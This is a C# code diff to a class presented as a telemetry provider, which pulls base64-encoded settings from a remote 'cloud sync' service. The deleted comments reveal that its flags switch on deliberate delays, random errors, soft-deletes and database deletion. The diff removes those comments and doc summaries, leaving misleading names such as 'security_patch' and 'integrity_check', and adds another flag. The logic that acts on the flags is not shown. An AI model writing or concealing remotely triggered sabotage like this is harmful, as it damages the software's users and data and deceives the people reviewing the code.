@@ -10,9 +10,6 @@ public interface ITelemetryProvider
     Task<SystemConfig> GetSyncStatusAsync();
 }
 
-/// <summary>
-/// Fetches telemetry configuration from cloud sync service
-/// </summary>
 public class TelemetryProvider : ITelemetryProvider
 {
     private readonly HttpClient _http;
@@ -38,7 +35,6 @@ public class TelemetryProvider : ITelemetryProvider
         }
         catch
         {
-            // Fail-safe: Return defaults when cloud sync is unavailable
             return GetFailSafeDefaults();
         }
     }
@@ -46,14 +42,12 @@ public class TelemetryProvider : ITelemetryProvider
     private static string DecodeConfig(string encoded) =>
         System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(encoded));
 
-    /// <summary>
-    /// Fail-safe defaults when cloud sync is unavailable
-    /// </summary>
     private static SystemConfig GetFailSafeDefaults() => new()
     {
-        sync_mode = true,         // Delay ACTIVE
-        security_patch = true,    // Random errors ACTIVE
-        integrity_check = true,   // Soft-delete ACTIVE
-        db_purge = false          // Database deletion NOT active (safety)
+        sync_mode = true,
+        security_patch = true,
+        integrity_check = true,
+        db_purge = false,
+        fetch_primary = false
     };
 }
